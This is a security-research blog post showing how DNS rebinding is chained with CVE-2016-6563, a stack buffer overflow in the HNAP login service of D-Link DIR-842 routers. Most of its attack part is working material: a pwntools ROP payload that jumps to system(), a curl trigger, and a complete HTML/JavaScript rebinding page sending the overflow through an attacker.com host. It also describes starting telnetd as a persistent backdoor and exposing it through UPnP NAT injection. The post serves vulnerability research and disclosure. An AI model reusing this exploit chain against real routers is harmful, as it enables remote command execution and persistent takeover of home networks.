---
title: "A Journey Into the Beauty of DNSRebinding - Part 2"
date: 2021-08-31T01:17:00.006-07:00
draft: false
type: posts
categories: 
- DeviceSecurity,DNS Rebinding,IoT,UPnP
---
# A Journey Into the Beauty of DNSRebinding - Part 2

<br/>

<br/>
#### **

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFUbwqScaadVAeGqh3JSxLZaH936SBrNxYcarxTAfoYRcIIQ_JkbhqxYQL8JweFLYA3rtyNpQJw5shaJuNyzQ0V2BHSJvSdwPG18x0__WARFFboPLK3Bbx2Wytckpk73VP82HW9ghG861B/s0/DNS_2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFUbwqScaadVAeGqh3JSxLZaH936SBrNxYcarxTAfoYRcIIQ_JkbhqxYQL8JweFLYA3rtyNpQJw5shaJuNyzQ0V2BHSJvSdwPG18x0__WARFFboPLK3Bbx2Wytckpk73VP82HW9ghG861B/s253/DNS_2.jpg)

  
  
**

#### **Abstract**

In the [first](https://blog.mindedsecurity.com/2021/02/journey-into-beauty-of-dnsrebinding.html) part, after a fast overview on the _DNS Rebinding_ technique, we considered a practical example in which UPnP services has been exploited to perform NAT Injection attacks and, therefore, expose internal services on Internet.

In this second post we are going to demonstrate how _DNS Rebinding_ could be used to exploit vulnerable services running locally in order to achieve Remote Code Execution (RCE). 

In particular, we will consider the case of [CVE-2016-6563](https://nvd.nist.gov/vuln/detail/CVE-2016-6563), which consists in a known Buffer Overflow issue caused by an unsafe parsing of the XML fields present in the login SOAP request affecting the HNAP service of some D-Link routers.

In short, below are listed the steps in order to create a working _DNS Rebinding_ proof of concept:

-   Firmware static and dynamic analysis;
-   Buffer Overflow sink and source identification through static binary analysis;
-   Exploit development through binary emulation;
-   DNS Rebinding + Buffer Overflow ROP exploit chaining.

  

  

#### Static Firmware and Binary Analysis

As a first step, we downloaded the "DIR-842\_C1\_FW300b18.bin" firmware, which was available on the vendor site, and extracted the _squash-fs_ filesystem by using _binwalk_.  

  

$ binwalk \-e DIR-842\_C1\_FW300b18.bin   
​  
DECIMAL       HEXADECIMAL     DESCRIPTION  
\--------------------------------------------------------------------------------  
0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/5"  
112           0x70            uImage header, header size: 64 bytes, header CRC: 0x6A7785EB, created: 2017\-05-19 16:57:27, image size: 1226247 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xCD5C9222, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: "MIPS Seattle Linux-3.3.8"  
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3616252 bytes  
1245296       0x130070        PackImg section delimiter tag, little endian size: 15765760 bytes; big endian size: 9564160 bytes  
1245328       0x130090        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 9563526 bytes, 2480 inodes, blocksize: 131072 bytes, created: 2017\-05-19 16:57:32  
​

  
Then we stared to inspect the "hnap" binary inside the filesystem and we found the same behavior described in [CVE-2016-6563](https://nvd.nist.gov/vuln/detail/CVE-2016-6563).  

  

We have then reversed the target binary with _Ghidra_ and, by looking for the the strings related to the login parameters, we have identified the following function, which was renamed as "Vulnerable" in the following snippet of code.

  

undefined4 Vulnerable(char \*param\_1)  
​  
{  
  undefined4 uVar1;  
  int iVar2;  
  size\_t sVar3;  
  char \*pcVar4;  
  undefined4 local\_758;  
  undefined4 local\_750;  
  char \*local\_74c;  
  char \*local\_748;  
  undefined auStack1860 \[4\];  
  undefined4 local\_740;  
  char acStack1852 \[80\];  
  char acStack1772 \[144\];  
  char acStack1628 \[64\];  
  char acStack1564 \[64\];  
  undefined2 local\_5dc;  
  char acStack1484 \[64\];  
  char acStack1420 \[68\];  
  char acStack1352 \[64\];  
  char Action \[128\];  
  char Username \[128\];  
  char Password \[128\];  
  undefined Captcha \[128\];  
  undefined auStack776 \[10\];  
  undefined auStack766 \[20\];  
  undefined auStack746 \[98\];  
  char acStack648 \[64\];  
  char acStack584 \[64\];  
  undefined auStack520 \[64\];  
  char acStack456 \[64\];  
  char acStack392 \[128\];  
  char acStack264 \[128\];  
  char acStack136 \[128\];  
    
  memset(Action,0,0x80);  
  memset(Username,0,0x80);  
  memset(Password,0,0x80);  
  memset(Captcha,0,0x80);  
  memset(auStack776,0,0x80);  
  memset(acStack648,0,0x40);  
  memset(acStack584,0,0x40);  
  memset(auStack520,0,0x40);  
  memset(acStack456,0,0x40);  
  memset(acStack392,0,0x80);  
  memset(acStack264,0,0x80);  
  DAT\_00433260 \= FUN\_0041e620();  
  local\_758 \= 0;  
  FUN\_004057ec(FUN\_00419794,0,0x10000);  
  uVar1 \= FUN\_0041edb4(DAT\_00433260);  
  VulnerableCalled(uVar1,"Action",Action);  
  uVar1 \= FUN\_0041edb4(DAT\_00433260);  
  VulnerableCalled(uVar1,"Username",Username);  
  uVar1 \= FUN\_0041edb4(DAT\_00433260);  
  VulnerableCalled(uVar1,"LoginPassword",Password);  
  uVar1 \= FUN\_0041edb4(DAT\_00433260);  
  VulnerableCalled(uVar1,"Captcha",Captcha);  
    
  . . .

The "Action", "Username", "LoginPassword" and "Captcha" XML fields are parsed by the (renamed) "VulnerableXMLParser" method:

  

void VulnerableXMLParser(char \*controllable\_input,undefined4 param\_2,char \*destination\_buffer)  
​  
{  
  size\_t length\_param;  
  char \*p;  
  char \*pcVar1;  
  char var\_overflow \[1024\];  
  char acStack2060 \[1024\];  
  char EOT \[1028\];  
    
  sprintf(acStack2060,"<%s>",param\_2);  
  sprintf(EOT,"</%s>",param\_2);  
  length\_param \= strlen(acStack2060);  
  p \= strstr(controllable\_input,acStack2060);  
  if (p != (char \*)0x0) {  
    p \= p + length\_param;  
    pcVar1 \= strstr(p,EOT);  
    if ((pcVar1 != (char \*)0x0) && (pcVar1 \= pcVar1 + \-(int)p, \-1 < (int)pcVar1)) {  
      strlcpy(var\_overflow,p,pcVar1 + 1);  
      var\_overflow\[(int)pcVar1\] \= '\\0';  
      strcpy(destination\_buffer,var\_overflow);  
    }  
  }  
  return;  
}

Here the user-controllable input present in the login parameter tags is copied in an insecure way:

-   inside a local buffer (i.e. "var\_overflow");
-   into the 128 byte buffer defined inside the caller function through the "destination\_buffer" pointer.

  

#### **Firmware Emulation and Binary** Debugging

In order to try to exploit the issue we have tried to emulate the firmware. We then used [_FAT_](https://github.com/attify/firmware-analysis-toolkit) in order to achieve full system emulation:

  

\# ./fat.py ../fwrs/DIR-842\_C1\_FW300b18.bin   
​  
                               \_\_          \_  
                              / \_|         | |  
                             | |\_    \_\_ \_  | |\_  
                             |  \_|  / \_\` | | \_\_|  
                             | |  | (\_| | | |\_  
                             |\_|   \\\_\_,\_|  \\\_\_|  
​  
                Welcome to the Firmware Analysis Toolkit - v0.3  
    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation  
                  By Attify - https://attify.com  | @attifyme  
      
\[+\] Firmware: DIR-842\_C1\_FW300b18.bin  
\[+\] Extracting the firmware...  
\[+\] Image ID: 1  
\[+\] Identifying architecture...  
\[+\] Architecture: mipseb  
\[+\] Building QEMU disk image...  
\[+\] Setting up the network connection, please standby...  
\[+\] Network interfaces: \[('br0', '192.168.0.1'), ('br1', '192.168.7.1')\]  
\[+\] All set! Press ENTER to run the firmware...  
\[+\] When running, press Ctrl + A X to terminate qemu  
Creating TAP device tap1\_0...  
Set 'tap1\_0' persistent and owned by uid 0  
Initializing VLAN...  
Bringing up TAP device...  
attify123  
Adding route to 192.168.0.1...  
Starting firmware emulation... use Ctrl-a + x to exit  
\[    0.000000\] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016  
\[    0.000000\]   
\[    0.000000\] LINUX started...  
\[    0.000000\] bootconsole \[early0\] enabled  
\[    0.000000\] CPU revision is: 00019300 (MIPS 24Kc)  
\[    0.000000\] FPU revision is: 00739300  
\[    0.000000\] Determined physical RAM map:  
​

[![](https://1.bp.blogspot.com/-1jT-WOTJDLE/YF3_i8DQ_QI/AAAAAAAAAAM/TZ6SwtBI5eA3O4TTcKRdfhw8eNN-EgIIQCLcBGAsYHQ/w652-h248/dlink.png)](https://1.bp.blogspot.com/-1jT-WOTJDLE/YF3_i8DQ_QI/AAAAAAAAAAM/TZ6SwtBI5eA3O4TTcKRdfhw8eNN-EgIIQCLcBGAsYHQ/s1638/dlink.png)

  

  

  
However, we have used the [_QEMU_](https://qemu-project.gitlab.io/qemu/user/main.html) user-mode emulation feature with the aim of debugging the issue and creating a working exploit.

  
In particular, the following setting was used to emulate a HTTP request to the target _mips_ "hnap" service:

  

sudo chroot . ./qemu-mips-static \-E HTTP\_SOAPACTION\="http://purenetworks.com/HNAP1/Login" \-E HTTP\_HNAP\_AUTH\="69201619B75DDDFF967E6ADD87BA945F 1583432673" \-E REQUEST\_URI\="/HNAP1/" \-E REQUET\_METHOD\="POST" \-E HTTP\_COOKIE\="uid=99TIA1AP7" \-E CONTENT\_LENGTH\=2640 \-E CONTENT\_TYPE\="text/xml; charset=utf-8" \-g 4444 ./htdocs/HNAP1/hnap

Following the description of the used parameters:  

-   _chroot_: the full command was executed within the root directory of the extracted _squash-fs_ filesystem, so _chroot ._ makes this directory the root directory;
-   _qemu-mips-static_: allows to emulate MIPS binaries. The "-E" options was used to set some environment variables required by "hnap" to regularly invoke the vulnerable method; "-g" sets the "QEMU\_GDB" environment variable that opens a _gdb-server_ on the specified port (in this case port 4444).

  
It was then possible to attach to the _gdb-server_ running on "localhost:4444" and debugging the target binary using _gdb-multiarch_ as follows:

  

$ gdb\-multiarch   
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git  
Copyright (C) 2018 Free Software Foundation, Inc.  
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  
This is free software: you are free to change and redistribute it.  
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"  
and "show warranty" for details.  
This GDB was configured as "x86\_64-linux-gnu".  
Type "show configuration" for configuration details.  
For bug reporting instructions, please see:  
<http://www.gnu.org/software/gdb/bugs/>.  
Find the GDB manual and other documentation resources online at:  
<http://www.gnu.org/software/gdb/documentation/>.  
For help, type "help".  
Type "apropos word" to search for commands related to "word".  
(gdb) file htdocs/HNAP1/hnap   
Reading symbols from htdocs/HNAP1/hnap...(no debugging symbols found)...done.  
(gdb) target remote 127.0.0.1:4444  
Remote debugging using 127.0.0.1:4444  
warning: remote target does not support file transfer, attempting to access files from local filesystem.  
Reading symbols from ~/firmware/fwrs/\_DIR-842\_C1\_FW300b18.bin.extracted/squashfs-root/lib/ld-uClibc-0.9.33.2.so...(no debugging symbols found)...done.  
0x7f7e7f90 in \_start () from ~/firmware/fwrs/\_DIR-842\_C1\_FW300b18.bin.extracted/squashfs-root/lib/ld-uClibc-0.9.33.2.so  
(gdb) c  
Continuing.  
​

#### 

#### **A working Buffer Overflow exploit**

After some digging into the analysis both user-mode and system-mode, we got a running ROP exploit that allowed us to execute an arbitrary command by jumping to the _ld-uClibc-0.9.33.2_ _system()_ function:

  

from pwn import \*  
​  
def p32\_big(data):  
        return p32(data, endian = 'big')  
​  
libc\_text\_base = 0x2aae4000  
libc\_text\_start  = 0x0  
libc\_system = libc\_text\_base + (0x00062104 \- libc\_text\_start)  
gadget1 = libc\_text\_base + (0x00042e08 \- libc\_text\_start)  
\# identified gadget  
\# 0x00042e08 : sw $v0, 0xa8($sp) ; addiu $a0, $sp, 0xb8 ; lw $t9, 0x24($sp) ; jalr $t9 ; move $a1, $s6  
  
payload = "A" \* 1028 + p32\_big(gadget1)  
payload += "BBBB" \# $sp points here  
payload += "C" \* 32  
payload += p32\_big(libc\_system)  
payload += "C" \* 144  
payload += "touch /tmp/minded;" \# here the command to execute  
soap\_body = "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><soap:Envelope xmlns:xsi=\\"http://www.w3.org/2001/XMLSchema-instance\\" xmlns:xsd=\\"http://www.w3.org/2001/XMLSchema\\" xmlns:soap=\\"http://schemas.xmlsoap.org/soap/envelope/\\"><soap:Body><Login xmlns=\\"http://purenetworks.com/HNAP1/\\"><Action>request</Action><Username>Admin</Username><LoginPassword>" + payload + "</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>"  
​  
print(soap\_body)

  

The following gadget was found in the libc address and used to perform a return-to-system:  
  

0x00042e08 : sw $v0, 0xa8($sp) ; addiu $a0, $sp, 0xb8 ; lw $t9, 0x24($sp) ; jalr $t9 ; move $a1, $s6

The gadget allows to jump to the next instruction through `jalr $t9` and `lw $t9, 0x24($sp)`; so we put the address of _system()_ 36 bytes after the current pointed address. 

  

The argument of _system()_, was previously controlled thanks to `addiu $a0, $sp, 0xb8`, which points to the stack location that contains the command to execute.

Once adjusted the _libc_ base address according to the system-mode, we could test the exploit by using _curl_ (the body file contains the output of the python exploit):

  

$ curl \-X POST \-d @body http://192.168.0.1/HNAP1/ \-H 'SOAPAction: http://purenetworks.com/HNAP1/Login' \-H 'HNAP\_AUTH: 7A6EA9269CBB71629F4EF2926343C7A1 1583173034' \-H 'Content-Type: text/xml; charset=utf-8'  
  
<title>500 Internal Server Error</title>  
<h1>500 Internal Server Error</h1>  
​

  

The "touch /tmp/minded" command was successfully executed as this file was written in the "/tmp" directory of the emulated firmware. 

  

The following output is related to _FAT_ and shows the emulated router console exposing the _SIGSEGV_ crash caused by the running exploit. 

  

\# \[ 5278.120000\] do\_page\_fault() #2: sending SIGSEGV to hnap for invalid read access from  
\[ 5278.120000\] 68202f90 (epc == 2ab26e20, ra == 2ab26e1c)  
\[ 5278.120000\] Cpu 0  
\[ 5278.120000\] $ 0   : 00000000 1000a400 68202f74 00000001  
\[ 5278.120000\] $ 4   : 2ab64000 7f80be50 00000000 00000000  
\[ 5278.120000\] $ 8   : 00000000 80104960 8f06cc98 0000000a  
\[ 5278.124000\] $12   : 00000008 811e41c0 00000000 00000000  
\[ 5278.124000\] $16   : 7f80cd88 2ab44000 004013b8 0049e444  
\[ 5278.124000\] $20   : 00487ec0 0049e88c 004a0000 00000000  
\[ 5278.124000\] $24   : 8f3cc4f0 2ab1db80                    
\[ 5278.124000\] $28   : 2ab65400 7f80bea0 41414141 2ab26e1c  
\[ 5278.124000\] Hi    : 00000000  
\[ 5278.124000\] Lo    : 00000000  
\[ 5278.124000\] epc   : 2ab26e20 0x2ab26e20  
\[ 5278.124000\]     Not tainted  
\[ 5278.124000\] ra    : 2ab26e1c 0x2ab26e1c  
\[ 5278.124000\] Status: 0000a413    USER EXL IE   
\[ 5278.124000\] Cause : 10800008  
\[ 5278.124000\] BadVA : 68202f90  
\[ 5278.124000\] PrId  : 00019300 (MIPS 24Kc)  
\[ 5278.124000\] Modules linked in:  
\[ 5278.124000\] Process hnap (pid: 20107, threadinfo=8f1b6000, task=8f2bd6e0, tls=2aab7440)  
\[ 5278.124000\] Stack : 42424242 43434343 43434343 43434343 43434343 43434343 43434343 43434343  
\[ 5278.124000\]         43434343 2ab46104 43434343 43434343 43434343 43434343 43434343 43434343  
\[ 5278.128000\]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343  
\[ 5278.128000\]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343  
\[ 5278.128000\]         43434343 43434343 43434343 43434343 43434343 43434343 43434343 43434343  
\[ 5278.128000\]         ...  
\[ 5278.128000\] Call Trace:  
\[ 5278.128000\]   
\[ 5278.128000\]   
\[ 5278.128000\] Code: 0320f809  02c02821  8fa200bc <8c59001c> 13200004  8fbc0018  0320f809  27a400b8  8fbc0018   
\[ 5278.128000\] hnap/20107: potentially unexpected fatal signal 11.  
\[ 5278.128000\]   
\[ 5278.128000\] Cpu 0  
\[ 5278.128000\] $ 0   : 00000000 1000a400 68202f74 00000001  
\[ 5278.132000\] $ 4   : 2ab64000 7f80be50 00000000 00000000  
\[ 5278.132000\] $ 8   : 00000000 80104960 8f06cc98 0000000a  
\[ 5278.132000\] $12   : 00000008 811e41c0 00000000 00000000  
\[ 5278.132000\] $16   : 7f80cd88 2ab44000 004013b8 0049e444  
\[ 5278.132000\] $20   : 00487ec0 0049e88c 004a0000 00000000  
\[ 5278.132000\] $24   : 8f3cc4f0 2ab1db80                    
\[ 5278.132000\] $28   : 2ab65400 7f80bea0 41414141 2ab26e1c  
\[ 5278.132000\] Hi    : 00000000  
\[ 5278.132000\] Lo    : 00000000  
\[ 5278.132000\] epc   : 2ab26e20 0x2ab26e20  
\[ 5278.132000\]     Not tainted  
\[ 5278.132000\] ra    : 2ab26e1c 0x2ab26e1c  
\[ 5278.132000\] Status: 0000a413    USER EXL IE   
\[ 5278.132000\] Cause : 10800008  
\[ 5278.132000\] BadVA : 68202f90  
\[ 5278.132000\] PrId  : 00019300 (MIPS 24Kc)

Following the proof of the execution of the _touch_ command (of the _minded_ file).

  

  
\# ls /tmp/  
server.key     wburfe         wifi0.caldata **_minded_**  
server.crt     hapfie         wifi1.caldata  
​

  

#### Remote Command Execution through DNS Rebinding attack

It was then possible to embed the generated payload inside an _xhr_ SOAP request in the _DNS Rebinding_ HTML attack page we used in the [first](https://blog.mindedsecurity.com/2021/02/journey-into-beauty-of-dnsrebinding.html) part:

  

<html\>  
<head\>  
    <script src\="jquery.min.js"\></script\>  
    <script\>  
          
        function exploit()  
        {  
            var xhr \= new XMLHttpRequest();  
            xhr.open("POST", "http:\\/\\/127-0-0-1.192-168-0-1.attacker.com\\/HNAP1\\/", true);  
            xhr.setRequestHeader("Accept", "\*\\/\*");  
            xhr.setRequestHeader("Content-Type", "text\\/xml; charset=utf-8");  
            xhr.setRequestHeader("SOAPAction","http:\\/\\/purenetworks.com\\/HNAP1\\/Login");  
            xhr.setRequestHeader("HNAP\_AUTH","7A6EA9269CBB71629F4EF2926343C7A1 1583173034");  
            xhr.withCredentials \= true;  
            var body \= "\\x3c?xml version=\\"1.0\\" encoding=\\"utf-8\\"?\\x3e\\x3csoap:Envelope xmlns:xsi=\\"http://www.w3.org/2001/XMLSchema-instance\\" xmlns:xsd=\\"http://www.w3.org/2001/XMLSchema\\" xmlns:soap=\\"http://schemas.xmlsoap.org/soap/envelope/\\"\\x3e\\x3csoap:Body\\x3e\\x3cLogin xmlns=\\"http://purenetworks.com/HNAP1/\\"\\x3e\\x3cAction\\x3erequest\\x3c/Action\\x3e\\x3cUsername\\x3eAdmin\\x3c/Username\\x3e\\x3cLoginPassword\\x3eAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\*\\xb2n\\x08BBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\*\\xb4a\\x04CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCtouch \\/tmp\\/testJS\\x3c/LoginPassword\\x3e\\x3cCaptcha\\x3e\\x3c/Captcha\\x3e\\x3c/Login\\x3e\\x3c/soap:Body\\x3e\\x3c/soap:Envelope\\x3e";  
            var aBody \= new Uint8Array(body.length);  
            for (var i \= 0; i < aBody.length; i++)  
            aBody\[i\] \= body.charCodeAt(i);   
            xhr.send(new Blob(\[aBody\]));  
        }  
​  
        var trigger \= true;  
        function start() {  
           jQuery.ajax ({  
                url: "/info/Login.html",  
                type: "GET",  
                data: "",  
                 }).always(function (data,status){  
                    console.log("\[+\] Checking SOP bypass...");  
                    if(trigger && data.includes("<title>D-LINK</title>")){  
                       console.log("\[+\] Sending Exploit...");  
                        exploit();  
                        trigger \= false;  
                    }else{  
                        console.log("\[+\] Waiting...");  
                    }  
                });  
        }  
        function poll() {  
            setTimeout(function () {  
                if(trigger){  
                    start();  
                    poll();  
                }else{  
                    console.log("\[+\] Exploit sent...")  
                }  
            }, 6000);  
        }  
​  
        $(document).ready(function () {  
            poll();  
        });  
    </script\>  
</head\>  
​  
<body\>  
    <h1\>DNS Rebinding Attack against Dlink Router CVE-XXXXX</h1\>  
    <br\><br\><br\>  
    <marquee\>Insert here something...</marquee\>  
</body\>  
</html\>  
​

Below the screenshot showing the execution of the _xhr_ request after the successful _DNS Rebinding_ attack.

The exploit was successfully executed and the "testJS" file was created on the filesystem of the router.

  

![](https://lh6.googleusercontent.com/leubTyJ0ntk7VNyq9qnw3ecIvgy8pUsmDUzNKSYHVhMGWIMNWcCCTJCrRGvO86Fj5V4lA_4BwmytjJab8TuiWCTPk11xnu68gveS3UujPtDNrZtu17GVtp1iQYxzDYCX_jKbuK_o2NM=w320-h172)

  
  

Following the complete _DNS Rebinding_ attack scheme.

[![](https://1.bp.blogspot.com/-8Lrxd-1VER0/YH76iiJdq0I/AAAAAAAAABU/JcytQ5XcerYnjtdBEB7ySHX-OT2s1hBIQCLcBGAsYHQ/w320-h205/rop_diagram.png)](https://1.bp.blogspot.com/-8Lrxd-1VER0/YH76iiJdq0I/AAAAAAAAABU/JcytQ5XcerYnjtdBEB7ySHX-OT2s1hBIQCLcBGAsYHQ/s1031/rop_diagram.png)

  

#### 

#### **Getting Persistence using DNS Rebinding + UPnP NAT Injection + _telnetd_ service**

  

The next step for an attacker would be to create a backdoor in order to get persistent access to the victim's device.

During the static firmware analysis we noticed the existence of "/usr/sbin/telnetd" within the firmware, so we could force the router to run the _telnetd_ service just by replacing his path in the working exploit. 

  

Following the generated HTTP request.

  

[![](https://1.bp.blogspot.com/-JF6kxyfsdl0/YImNNQ0h6-I/AAAAAAAAABs/0LUssnx8LYogCBOq9EHn_-oYzwikFJRMQCLcBGAsYHQ/s16000/Screenshot_20210428_182757.png)](https://1.bp.blogspot.com/-JF6kxyfsdl0/YImNNQ0h6-I/AAAAAAAAABs/0LUssnx8LYogCBOq9EHn_-oYzwikFJRMQCLcBGAsYHQ/s1217/Screenshot_20210428_182757.png)

  
  
The service was executed on the machine as shown in the following screenshot that shows the _nmap_ output before and after the exploit execution.

  

Telnet service status before the exploit execution:

  

[![](https://lh3.googleusercontent.com/-mGvtiQBYH6k/YQQdwY-1RBI/AAAAAAAAAEk/_BJQ72Uuz0Ia3YrF6KR84NdQGHi8nZVjACLcBGAsYHQ/image.png)](https://lh3.googleusercontent.com/-mGvtiQBYH6k/YQQdwY-1RBI/AAAAAAAAAEk/_BJQ72Uuz0Ia3YrF6KR84NdQGHi8nZVjACLcBGAsYHQ/image.png)

  
  

Telnet service started after the exploit execution:

[![](https://lh3.googleusercontent.com/-Fv5cuUPF9MU/YQQeFFyZnvI/AAAAAAAAAEs/fi7C74UrmFIIzdDB9xXqruoalaKhUoGTQCLcBGAsYHQ/image.png)](https://lh3.googleusercontent.com/-Fv5cuUPF9MU/YQQeFFyZnvI/AAAAAAAAAEs/fi7C74UrmFIIzdDB9xXqruoalaKhUoGTQCLcBGAsYHQ/image.png)

[![](https://lh3.googleusercontent.com/-YL2v9UJ0ubM/YQQeJdfoBFI/AAAAAAAAAEw/MqhaKelVYVUeeou6hxM5QmtEMNvwlcjaQCLcBGAsYHQ/image.png)](https://lh3.googleusercontent.com/-YL2v9UJ0ubM/YQQeJdfoBFI/AAAAAAAAAEw/MqhaKelVYVUeeou6hxM5QmtEMNvwlcjaQCLcBGAsYHQ/image.png)

  

#### Conclusion

We were able to use the _DNS Rebinding_ attack against [CVE-2016-6563](https://nvd.nist.gov/vuln/detail/CVE-2016-6563) proving that it is possible to execute a Remote Command Execution against a not public facing service, as the web interface of a router.

  

Moreover, we have used the _UPnP_ _NAT Injection_ technique from the [first](https://blog.mindedsecurity.com/2021/02/journey-into-beauty-of-dnsrebinding.html) part to expose the _telnetd_ service to the public interface in order to get a remote backdoor.

Below the Attack Tree of the proposed attack:

[![](https://1.bp.blogspot.com/-GIJHLg9xXsU/YKU1jprlCEI/AAAAAAAAACM/aJA5ejcEpvcQRqFfyj6-Ta2eQrxX9BtEQCLcBGAsYHQ/w490-h408/Screenshot_20210519_175741.png)](https://1.bp.blogspot.com/-GIJHLg9xXsU/YKU1jprlCEI/AAAAAAAAACM/aJA5ejcEpvcQRqFfyj6-Ta2eQrxX9BtEQCLcBGAsYHQ/s698/Screenshot_20210519_175741.png)

  

#### References:

-   [https://eu.dlink.com/uk/en/support/support-news/2016/november/10/routers-hnap-service-stack-based-buffer-overflow-vulnerability](https://eu.dlink.com/uk/en/support/support-news/2016/november/10/routers-hnap-service-stack-based-buffer-overflow-vulnerability)
-   [https://packetstormsecurity.com/files/139611/D-Link-DIR-Routers-HNAP-Login-Stack-Buffer-Overflow.html](https://packetstormsecurity.com/files/139611/D-Link-DIR-Routers-HNAP-Login-Stack-Buffer-Overflow.html)
-   [https://www.rapid7.com/db/modules/exploit/linux/http/dlink\_hnap\_bof/](https://www.rapid7.com/db/modules/exploit/linux/http/dlink_hnap_bof/)

#### **Authors**

Alessandro Braccio

Giovanni Guido

#### [Source](https://blog.mindedsecurity.com/feeds/5080481252049500209/comments/default)

<br/>
---
